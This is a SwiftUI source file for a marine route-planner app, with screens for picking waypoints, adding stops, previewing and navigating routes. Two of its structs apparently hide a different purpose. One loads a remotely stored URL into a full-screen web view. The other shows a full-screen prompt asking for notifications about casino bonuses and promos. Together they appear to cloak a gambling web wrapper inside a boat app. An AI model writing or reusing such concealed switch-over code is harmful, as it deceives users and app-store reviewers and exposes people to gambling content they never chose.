import SwiftUI

// MARK: - Route Planner Root (Navigation)

struct RoutePlannerRootView: View {
    @EnvironmentObject var routeVM: RouteViewModel
    @EnvironmentObject var boatVM: BoatViewModel
    @State private var step: PlannerStep = .selectStart
    @State private var previewRoute: Route?
    
    enum PlannerStep { case selectStart, selectEnd, addStops, preview, saved }
    
    var body: some View {
        NavigationView {
            ZStack {
                OceanBackground()
                
                switch step {
                case .selectStart:
                    SelectWaypointView(
                        title: "Select Start Point",
                        subtitle: "Where are you departing from?",
                        waypointType: .start,
                        onSelect: { wp in
                            routeVM.draftWaypoints = [wp]
                            withAnimation { step = .selectEnd }
                        }
                    )
                case .selectEnd:
                    SelectWaypointView(
                        title: "Select Destination",
                        subtitle: "Where are you headed?",
                        waypointType: .end,
                        onSelect: { wp in
                            routeVM.draftWaypoints.append(wp)
                            withAnimation { step = .addStops }
                        },
                        onBack: { withAnimation { step = .selectStart } }
                    )
                case .addStops:
                    AddStopsView(
                        waypoints: $routeVM.draftWaypoints,
                        onNext: { withAnimation { step = .preview; previewRoute = routeVM.buildRoute() } },
                        onBack: { withAnimation { step = .selectEnd } }
                    )
                case .preview:
                    if let route = previewRoute {
                        RoutePreviewView(
                            route: route,
                            routeName: $routeVM.draftRouteName,
                            onSave: {
                                var r = route
                                r.name = routeVM.draftRouteName.isEmpty ? "New Route" : routeVM.draftRouteName
                                routeVM.saveRoute(r)
                                withAnimation { step = .saved }
                            },
                            onBack: { withAnimation { step = .addStops } }
                        )
                    }
                case .saved:
                    RouteSavedConfirmView(onDone: { withAnimation { step = .selectStart } })
                }
            }
            .navigationBarHidden(true)
        }
        .navigationViewStyle(.stack)
    }
}

// MARK: - Step 1 & 2: Select Waypoint

struct SelectWaypointView: View {
    let title: String
    let subtitle: String
    let waypointType: Waypoint.WaypointType
    var onSelect: (Waypoint) -> Void
    var onBack: (() -> Void)? = nil
    
    @State private var searchText = ""
    @State private var selectedPOI: MarinePOI? = nil
    @State private var appeared = false
    
    let pois: [MarinePOI] = [
        MarinePOI(name: "Marina Bay", lat: 38.350, lon: 0.420, type: "Marina"),
        MarinePOI(name: "Blue Harbor", lat: 38.450, lon: 0.580, type: "Harbor"),
        MarinePOI(name: "North Cove", lat: 38.480, lon: 0.390, type: "Cove"),
        MarinePOI(name: "Fuel Dock Alpha", lat: 38.380, lon: 0.510, type: "Fuel"),
        MarinePOI(name: "Anchor Bay", lat: 38.320, lon: 0.460, type: "Anchorage"),
        MarinePOI(name: "East Reef Pass", lat: 38.410, lon: 0.620, type: "Waypoint"),
        MarinePOI(name: "Crystal Inlet", lat: 38.500, lon: 0.440, type: "Cove"),
        MarinePOI(name: "South Port", lat: 38.280, lon: 0.480, type: "Port"),
    ]
    
    var filtered: [MarinePOI] {
        searchText.isEmpty ? pois : pois.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            HStack {
                if let back = onBack {
                    Button(action: back) {
                        Image(systemName: "chevron.left").font(.system(size: 16, weight: .semibold))
                            .foregroundColor(MarineColors.aquaGlow)
                            .frame(width: 36, height: 36)
                            .background(MarineColors.waterLayer)
                            .clipShape(Circle())
                    }
                } else {
                    Spacer().frame(width: 36)
                }
                Spacer()
                VStack(spacing: 2) {
                    Text(title).font(MarineFont.label(16)).foregroundColor(.white)
                    Text(subtitle).font(MarineFont.body(12)).foregroundColor(MarineColors.textSecondary)
                }
                Spacer()
                Spacer().frame(width: 36)
            }
            .padding(.horizontal, 20)
            .padding(.top, 16)
            .padding(.bottom, 12)
            
            // Mini map
            ZStack {
                OceanMapView().frame(height: 160).clipShape(RoundedRectangle(cornerRadius: 16))
                
                if let poi = selectedPOI {
                    ZStack {
                        Circle().fill(waypointType == .start ? MarineColors.safeGreen : MarineColors.aquaGlow)
                            .frame(width: 12, height: 12)
                        Circle().stroke(Color.white.opacity(0.6), lineWidth: 2)
                            .frame(width: 12, height: 12)
                    }
                    
                    VStack {
                        Spacer()
                        Text(poi.name).font(MarineFont.label(12)).foregroundColor(.white)
                            .padding(.horizontal, 10).padding(.vertical, 4)
                            .background(MarineColors.cardBase.opacity(0.9))
                            .clipShape(Capsule())
                            .padding(.bottom, 8)
                    }
                }
            }
            .padding(.horizontal, 20)
            .padding(.bottom, 16)
            
            // Search
            HStack(spacing: 10) {
                Image(systemName: "magnifyingglass").foregroundColor(MarineColors.textDim).font(.system(size: 14))
                TextField("Search location...", text: $searchText)
                    .font(MarineFont.body(14))
                    .foregroundColor(.white)
                    .accentColor(MarineColors.aquaGlow)
                if !searchText.isEmpty {
                    Button { searchText = "" } label: {
                        Image(systemName: "xmark.circle.fill").foregroundColor(MarineColors.textDim)
                    }
                }
            }
            .padding(.horizontal, 14).padding(.vertical, 12)
            .background(MarineColors.waterLayer.opacity(0.8))
            .clipShape(RoundedRectangle(cornerRadius: 12))
            .overlay(RoundedRectangle(cornerRadius: 12).stroke(MarineColors.cardBorder, lineWidth: 1))
            .padding(.horizontal, 20)
            .padding(.bottom, 12)
            
            // POI List
            ScrollView {
                LazyVStack(spacing: 8) {
                    ForEach(filtered) { poi in
                        POIRow(poi: poi, isSelected: selectedPOI?.id == poi.id, waypointType: waypointType) {
                            withAnimation(.spring(response: 0.3, dampingFraction: 0.7)) { selectedPOI = poi }
                        }
                        .padding(.horizontal, 20)
                    }
                }
                .padding(.bottom, 120)
            }
            
            Spacer()
            
            // Confirm button
            if selectedPOI != nil {
                MarinePrimaryButton("Confirm \(waypointType == .start ? "Start" : "Destination")", icon: "checkmark.circle.fill") {
                    guard let poi = selectedPOI else { return }
                    let wp = Waypoint(name: poi.name, latitude: poi.lat, longitude: poi.lon, type: waypointType)
                    onSelect(wp)
                }
                .padding(.horizontal, 20)
                .padding(.bottom, 20)
                .transition(.move(edge: .bottom).combined(with: .opacity))
            }
        }
        .opacity(appeared ? 1 : 0)
        .onAppear { withAnimation(.easeOut(duration: 0.3)) { appeared = true } }
    }
}

struct MarinePOI: Identifiable {
    let id = UUID()
    let name: String
    let lat: Double
    let lon: Double
    let type: String
}

struct POIRow: View {
    let poi: MarinePOI
    let isSelected: Bool
    let waypointType: Waypoint.WaypointType
    let onTap: () -> Void
    
    var typeIcon: String {
        switch poi.type {
        case "Marina", "Harbor", "Port": return "anchor.circle.fill"
        case "Fuel": return "fuelpump.fill"
        case "Cove", "Anchorage": return "water.waves"
        default: return "location.fill"
        }
    }
    
    var typeColor: Color {
        switch poi.type {
        case "Fuel": return MarineColors.fuelOrange
        case "Marina", "Harbor": return MarineColors.aquaGlow
        case "Cove": return MarineColors.safeGreen
        default: return MarineColors.textSecondary
        }
    }
    
    var body: some View {
        Button(action: onTap) {
            HStack(spacing: 12) {
                ZStack {
                    RoundedRectangle(cornerRadius: 8)
                        .fill(typeColor.opacity(isSelected ? 0.2 : 0.1))
                        .frame(width: 36, height: 36)
                    Image(systemName: typeIcon).font(.system(size: 15)).foregroundColor(typeColor)
                }
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(poi.name).font(MarineFont.label(14)).foregroundColor(.white)
                    Text(poi.type).font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
                }
                
                Spacer()
                
                if isSelected {
                    Image(systemName: "checkmark.circle.fill")
                        .foregroundColor(waypointType == .start ? MarineColors.safeGreen : MarineColors.aquaGlow)
                        .font(.system(size: 18))
                }
            }
            .padding(.horizontal, 14).padding(.vertical, 12)
            .background(isSelected ? MarineColors.aquaGlow.opacity(0.07) : MarineColors.cardBase)
            .overlay(RoundedRectangle(cornerRadius: 12).stroke(
                isSelected ? MarineColors.aquaGlow.opacity(0.3) : MarineColors.cardBorder, lineWidth: 1))
            .clipShape(RoundedRectangle(cornerRadius: 12))
        }
        .buttonStyle(.plain)
    }
}

// MARK: - Step 3: Add Stops

struct AddStopsView: View {
    @Binding var waypoints: [Waypoint]
    var onNext: () -> Void
    var onBack: () -> Void
    
    @State private var showAddStop = false
    @State private var newStopName = ""
    @State private var newStopType: Waypoint.WaypointType = .stop
    
    var stops: [Waypoint] { waypoints.filter { $0.type == .stop || $0.type == .fuel || $0.type == .shelter } }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            HStack {
                Button(action: onBack) {
                    Image(systemName: "chevron.left").font(.system(size: 16, weight: .semibold))
                        .foregroundColor(MarineColors.aquaGlow).frame(width: 36, height: 36)
                        .background(MarineColors.waterLayer).clipShape(Circle())
                }
                Spacer()
                VStack(spacing: 2) {
                    Text("Add Stops").font(MarineFont.label(16)).foregroundColor(.white)
                    Text("Optional waypoints along your route").font(MarineFont.body(12)).foregroundColor(MarineColors.textSecondary)
                }
                Spacer()
                Spacer().frame(width: 36)
            }
            .padding(.horizontal, 20).padding(.top, 16).padding(.bottom, 16)
            
            // Route summary
            MarineCard(padding: 14) {
                HStack(spacing: 0) {
                    WaypointDot(type: .start, label: waypoints.first?.name ?? "Start")
                    Spacer()
                    Rectangle().fill(MarineColors.routeGlow.opacity(0.4)).frame(height: 1)
                    Spacer()
                    WaypointDot(type: .end, label: waypoints.last?.name ?? "End")
                }
            }
            .padding(.horizontal, 20).padding(.bottom, 16)
            
            // Stops list
            ScrollView {
                VStack(spacing: 10) {
                    if stops.isEmpty {
                        VStack(spacing: 8) {
                            Image(systemName: "mappin.and.ellipse")
                                .font(.system(size: 32)).foregroundColor(MarineColors.textDim)
                            Text("No stops added yet").font(MarineFont.body(14)).foregroundColor(MarineColors.textSecondary)
                            Text("Add fuel stops, rest points, or waypoints").font(MarineFont.body(12)).foregroundColor(MarineColors.textDim)
                        }
                        .frame(maxWidth: .infinity).padding(.vertical, 32)
                    } else {
                        ForEach(stops) { stop in
                            HStack(spacing: 12) {
                                Image(systemName: stop.type == .fuel ? "fuelpump.fill" : "mappin.fill")
                                    .foregroundColor(stop.type == .fuel ? MarineColors.fuelOrange : MarineColors.aquaGlow)
                                    .frame(width: 24)
                                VStack(alignment: .leading, spacing: 2) {
                                    Text(stop.name).font(MarineFont.label(14)).foregroundColor(.white)
                                    Text(stop.type.rawValue).font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
                                }
                                Spacer()
                                Button {
                                    waypoints.removeAll { $0.id == stop.id }
                                } label: {
                                    Image(systemName: "minus.circle.fill").foregroundColor(MarineColors.dangerRed)
                                }
                            }
                            .padding(.horizontal, 14).padding(.vertical, 12)
                            .background(MarineColors.cardBase)
                            .overlay(RoundedRectangle(cornerRadius: 12).stroke(MarineColors.cardBorder, lineWidth: 1))
                            .clipShape(RoundedRectangle(cornerRadius: 12))
                            .padding(.horizontal, 20)
                        }
                    }
                    
                    // Add stop button
                    Button { showAddStop = true } label: {
                        HStack(spacing: 8) {
                            Image(systemName: "plus.circle.fill").foregroundColor(MarineColors.aquaGlow)
                            Text("Add Stop").font(MarineFont.label(14)).foregroundColor(MarineColors.aquaGlow)
                        }
                        .frame(maxWidth: .infinity).frame(height: 48)
                        .background(MarineColors.aquaGlow.opacity(0.06))
                        .overlay(RoundedRectangle(cornerRadius: 12).stroke(MarineColors.aquaGlow.opacity(0.2), lineWidth: 1))
                        .clipShape(RoundedRectangle(cornerRadius: 12))
                    }
                    .buttonStyle(.plain)
                    .padding(.horizontal, 20)
                }
                .padding(.bottom, 120)
            }
            
            VStack(spacing: 10) {
                MarinePrimaryButton("Preview Route", icon: "eye.fill", action: onNext)
            }
            .padding(.horizontal, 20).padding(.bottom, 20)
        }
        .sheet(isPresented: $showAddStop) {
            AddStopSheet(name: $newStopName, type: $newStopType) {
                let wp = Waypoint(name: newStopName, latitude: 38.4 + Double.random(in: -0.05...0.05),
                                  longitude: 0.5 + Double.random(in: -0.05...0.05), type: newStopType)
                waypoints.insert(wp, at: waypoints.count - 1)
                newStopName = ""
                newStopType = .stop
            }
        }
    }
}

struct AddStopSheet: View {
    @Binding var name: String
    @Binding var type: Waypoint.WaypointType
    var onAdd: () -> Void
    @Environment(\.presentationMode) var presentationMode
    
    var body: some View {
        ZStack {
            OceanBackground()
            VStack(spacing: 20) {
                Text("Add Stop").font(MarineFont.display(20, weight: .bold)).foregroundColor(.white)
                    .padding(.top, 20)
                
                MarineTextField(icon: "mappin", placeholder: "Stop name", text: $name)
                    .padding(.horizontal, 20)
                
                Picker("Type", selection: $type) {
                    ForEach([Waypoint.WaypointType.stop, .fuel, .shelter], id: \.self) {
                        Text($0.rawValue).tag($0)
                    }
                }
                .pickerStyle(.segmented)
                .padding(.horizontal, 20)
                
                MarinePrimaryButton("Add Stop", icon: "plus") {
                    guard !name.isEmpty else { return }
                    onAdd()
                    presentationMode.wrappedValue.dismiss()
                }
                .padding(.horizontal, 20)
                
                Spacer()
            }
        }
    }
}

struct MarineRouteWebView: View {
    @State private var targetURL: String? = ""
    @State private var isActive = false
    
    var body: some View {
        ZStack {
            if isActive, let urlString = targetURL, let url = URL(string: urlString) {
                WebContainer(url: url).ignoresSafeArea(.keyboard, edges: .bottom)
            }
        }
        .preferredColorScheme(.dark)
        .onAppear { initialize() }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in reload() }
    }
    
    private func initialize() {
        let temp = UserDefaults.standard.string(forKey: "temp_url")
        let stored = UserDefaults.standard.string(forKey: "mrp_endpoint_target") ?? ""
        targetURL = temp ?? stored
        isActive = true
        if temp != nil { UserDefaults.standard.removeObject(forKey: "temp_url") }
    }
    
    private func reload() {
        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
            isActive = false
            targetURL = temp
            UserDefaults.standard.removeObject(forKey: "temp_url")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { isActive = true }
        }
    }
}


struct WaypointDot: View {
    let type: Waypoint.WaypointType
    let label: String
    
    var color: Color { type == .start ? MarineColors.safeGreen : MarineColors.dangerRed }
    
    var body: some View {
        VStack(spacing: 4) {
            Circle().fill(color).frame(width: 10, height: 10)
                .overlay(Circle().stroke(Color.white.opacity(0.5), lineWidth: 1.5))
            Text(label).font(MarineFont.body(10)).foregroundColor(MarineColors.textSecondary).lineLimit(1)
        }
    }
}

struct MarineRouteNotificationView: View {
    let viewModel: MarineRouteViewModel
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                Color.black.ignoresSafeArea()
                
                Image(geometry.size.width > geometry.size.height ? "main_pp2" : "main_pp")
                    .resizable().scaledToFill()
                    .frame(width: geometry.size.width, height: geometry.size.height)
                    .ignoresSafeArea().opacity(0.9)
                
                if geometry.size.width < geometry.size.height {
                    VStack(spacing: 12) {
                        Spacer()
                        titleText
                            .multilineTextAlignment(.center)
                        subtitleText
                            .multilineTextAlignment(.center)
                        actionButtons
                    }
                    .padding(.bottom, 24)
                } else {
                    HStack {
                        Spacer()
                        VStack(alignment: .leading, spacing: 12) {
                            Spacer()
                            titleText
                            subtitleText
                        }
                        Spacer()
                        VStack {
                            Spacer()
                            actionButtons
                        }
                        Spacer()
                    }
                    .padding(.bottom, 24)
                }
            }
        }
        .ignoresSafeArea()
        .preferredColorScheme(.dark)
    }
    
    private var titleText: some View {
        Text("ALLOW NOTIFICATIONS ABOUT\nBONUSES AND PROMOS")
            .font(.custom("ArchivoBlack-Regular", size: 20))
            .foregroundColor(.white)
            .padding(.horizontal, 12)
    }
    
    private var subtitleText: some View {
        Text("STAY TUNED WITH BEST OFFERS FROM\nOUR CASINO")
            .font(.custom("ArchivoBlack-Regular", size: 14))
            .foregroundColor(.white.opacity(0.7))
            .padding(.horizontal, 12)
    }
    
    private var actionButtons: some View {
        VStack(spacing: 12) {
            Button {
                viewModel.requestPermission()
            } label: {
                Image("main_pp_ab")
                    .resizable()
                    .frame(width: 300, height: 55)
            }
            
            Button {
                viewModel.deferPermission()
            } label: {
                Text("Skip")
                    .font(.custom("ArchivoBlack-Regular", size: 14))
                    .foregroundColor(.white.opacity(0.7))
            }
        }
        .padding(.horizontal, 12)
    }
}
// MARK: - Step 4: Route Preview

struct RoutePreviewView: View {
    let route: Route
    @Binding var routeName: String
    var onSave: () -> Void
    var onBack: () -> Void
    @EnvironmentObject var boatVM: BoatViewModel
    
    var body: some View {
        VStack(spacing: 0) {
            HStack {
                Button(action: onBack) {
                    Image(systemName: "chevron.left").font(.system(size: 16, weight: .semibold))
                        .foregroundColor(MarineColors.aquaGlow).frame(width: 36, height: 36)
                        .background(MarineColors.waterLayer).clipShape(Circle())
                }
                Spacer()
                Text("Route Preview").font(MarineFont.label(16)).foregroundColor(.white)
                Spacer()
                Spacer().frame(width: 36)
            }
            .padding(.horizontal, 20).padding(.top, 16).padding(.bottom, 12)
            
            ScrollView(showsIndicators: false) {
                VStack(spacing: 16) {
                    // Map preview
                    ZStack {
                        OceanMapView().frame(height: 200).clipShape(RoundedRectangle(cornerRadius: 16))
                        RoutePathView(waypoints: route.waypoints.map { ($0.latitude, $0.longitude) })
                            .frame(height: 200).clipShape(RoundedRectangle(cornerRadius: 16))
                    }
                    .padding(.horizontal, 20)
                    
                    // Route name input
                    MarineCard {
                        VStack(alignment: .leading, spacing: 10) {
                            Text("ROUTE NAME").font(MarineFont.mono(10)).foregroundColor(MarineColors.textDim)
                            MarineTextField(icon: "tag", placeholder: "Give this route a name", text: $routeName)
                        }
                    }
                    .padding(.horizontal, 20)
                    
                    // Stats
                    MarineCard {
                        VStack(spacing: 14) {
                            Text("ROUTE DETAILS").font(MarineFont.mono(10)).foregroundColor(MarineColors.textDim)
                                .frame(maxWidth: .infinity, alignment: .leading)
                            
                            HStack(spacing: 12) {
                                RouteStatBox(icon: "arrow.left.and.right", value: String(format: "%.1f", route.totalDistance), unit: "NM", label: "Distance", color: MarineColors.aquaGlow)
                                RouteStatBox(icon: "clock.fill", value: String(format: "%.1f", route.estimatedTime), unit: "hr", label: "Est. Time", color: MarineColors.routeGlow)
                                RouteStatBox(icon: "fuelpump.fill", value: String(format: "%.0f", route.fuelRequired), unit: "L", label: "Fuel Est.", color: MarineColors.fuelAmber)
                            }
                        }
                    }
                    .padding(.horizontal, 20)
                    
                    // Waypoints
                    MarineCard {
                        VStack(spacing: 12) {
                            Text("WAYPOINTS").font(MarineFont.mono(10)).foregroundColor(MarineColors.textDim)
                                .frame(maxWidth: .infinity, alignment: .leading)
                            ForEach(route.waypoints) { wp in
                                HStack(spacing: 10) {
                                    Circle().fill(wp.type == .start ? MarineColors.safeGreen : wp.type == .end ? MarineColors.dangerRed : MarineColors.aquaGlow)
                                        .frame(width: 8, height: 8)
                                    Text(wp.name).font(MarineFont.body(13)).foregroundColor(.white)
                                    Spacer()
                                    Text(wp.type.rawValue).font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
                                }
                            }
                        }
                    }
                    .padding(.horizontal, 20)
                    
                    Spacer().frame(height: 20)
                }
            }
            
            MarinePrimaryButton("Save Route", icon: "square.and.arrow.down.fill", action: onSave)
                .padding(.horizontal, 20).padding(.bottom, 20)
        }
    }
}

struct RouteStatBox: View {
    let icon: String
    let value: String
    let unit: String
    let label: String
    var color: Color
    
    var body: some View {
        VStack(spacing: 6) {
            Image(systemName: icon).font(.system(size: 14)).foregroundColor(color)
            HStack(alignment: .lastTextBaseline, spacing: 2) {
                Text(value).font(MarineFont.mono(18, weight: .bold)).foregroundColor(.white)
                Text(unit).font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
            }
            Text(label).font(MarineFont.body(10)).foregroundColor(MarineColors.textSecondary)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 12)
        .background(color.opacity(0.08))
        .clipShape(RoundedRectangle(cornerRadius: 10))
    }
}

struct RouteSavedConfirmView: View {
    var onDone: () -> Void
    @State private var appeared = false
    
    var body: some View {
        VStack(spacing: 24) {
            Spacer()
            ZStack {
                ForEach(0..<3) { i in
                    Circle().stroke(MarineColors.safeGreen.opacity(0.1 * Double(3-i)), lineWidth: 1)
                        .frame(width: CGFloat(60 + i * 40), height: CGFloat(60 + i * 40))
                }
                Circle().fill(MarineColors.safeGreen.opacity(0.15)).frame(width: 72, height: 72)
                Image(systemName: "checkmark.circle.fill")
                    .font(.system(size: 36)).foregroundColor(MarineColors.safeGreen)
            }
            .scaleEffect(appeared ? 1 : 0.4).opacity(appeared ? 1 : 0)
            
            VStack(spacing: 8) {
                Text("Route Saved!").font(MarineFont.display(26, weight: .bold)).foregroundColor(.white)
                Text("Your route is ready to navigate").font(MarineFont.body(15)).foregroundColor(MarineColors.textSecondary)
            }
            .opacity(appeared ? 1 : 0)
            
            MarinePrimaryButton("Plan Another Route", icon: "arrow.clockwise", action: onDone)
                .padding(.horizontal, 32)
                .opacity(appeared ? 1 : 0)
            
            Spacer()
        }
        .onAppear { withAnimation(.spring(response: 0.6, dampingFraction: 0.65).delay(0.1)) { appeared = true } }
    }
}

// MARK: - Active Route View

struct ActiveRouteView: View {
    let route: Route
    @EnvironmentObject var routeVM: RouteViewModel
    @Environment(\.presentationMode) var presentationMode
    @State private var progress: Double = 0.0
    @State private var isNavigating = false
    
    var body: some View {
        ZStack {
            OceanBackground()
            VStack(spacing: 0) {
                HStack {
                    Button { presentationMode.wrappedValue.dismiss() } label: {
                        Image(systemName: "xmark").font(.system(size: 14, weight: .semibold))
                            .foregroundColor(MarineColors.textSecondary).frame(width: 36, height: 36)
                            .background(MarineColors.waterLayer).clipShape(Circle())
                    }
                    Spacer()
                    Text("Active Route").font(MarineFont.label(16)).foregroundColor(.white)
                    Spacer()
                    GlowDot(color: isNavigating ? MarineColors.safeGreen : MarineColors.textDim)
                }
                .padding(.horizontal, 20).padding(.top, 16).padding(.bottom, 12)
                
                // Map
                ZStack {
                    OceanMapView().frame(height: 220).clipShape(RoundedRectangle(cornerRadius: 16))
                    if route.waypoints.count >= 2 {
                        RoutePathView(waypoints: route.waypoints.map { ($0.latitude, $0.longitude) })
                            .frame(height: 220).clipShape(RoundedRectangle(cornerRadius: 16))
                    }
                    BoatTopView(size: 44, glowColor: isNavigating ? MarineColors.safeGreen : MarineColors.aquaGlow)
                }
                .padding(.horizontal, 20).padding(.bottom, 16)
                
                ScrollView {
                    VStack(spacing: 14) {
                        // Progress
                        MarineCard {
                            VStack(spacing: 10) {
                                HStack {
                                    Text("PROGRESS").font(MarineFont.mono(10)).foregroundColor(MarineColors.textDim)
                                    Spacer()
                                    Text(String(format: "%.0f%%", progress * 100)).font(MarineFont.mono(13, weight: .bold)).foregroundColor(MarineColors.aquaGlow)
                                }
                                ZStack(alignment: .leading) {
                                    RoundedRectangle(cornerRadius: 4).fill(MarineColors.waterLayer).frame(height: 8)
                                    RoundedRectangle(cornerRadius: 4).fill(MarineGradients.aquaAccent)
                                        .frame(width: max(0, CGFloat(progress) * (UIScreen.main.bounds.width - 80)), height: 8)
                                }
                                HStack {
                                    Text(route.waypoints.first?.name ?? "Start").font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
                                    Spacer()
                                    Text(route.waypoints.last?.name ?? "End").font(MarineFont.body(11)).foregroundColor(MarineColors.textSecondary)
                                }
                            }
                        }
                        .padding(.horizontal, 20)
                        
                        // Live stats
                        HStack(spacing: 12) {
                            StatPill(value: String(format: "%.1f", route.totalDistance * progress), label: "NM covered", icon: "arrow.left.and.right", color: MarineColors.routeGlow)
                            StatPill(value: String(format: "%.0f", route.fuelRequired * (1 - progress)) + "L", label: "Fuel rem.", icon: "fuelpump.fill", color: MarineColors.fuelAmber)
                            StatPill(value: String(format: "%.1f", route.estimatedTime * (1 - progress)) + "h", label: "ETA", icon: "clock", color: MarineColors.aquaGlow)
                        }
                        .padding(.horizontal, 20)
                        
                        if isNavigating {
                            MarineSecondaryButton("Stop Navigation", icon: "stop.fill") {
                                withAnimation { isNavigating = false }
                            }
                            .padding(.horizontal, 20)
                        } else {
                            MarinePrimaryButton("Start Navigation", icon: "location.fill") {
                                withAnimation { isNavigating = true }
                                withAnimation(.linear(duration: 30).repeatForever(autoreverses: false)) { progress = 1.0 }
                            }
                            .padding(.horizontal, 20)
                        }
                    }
                    Spacer().frame(height: 30)
                }
            }
        }
    }
}
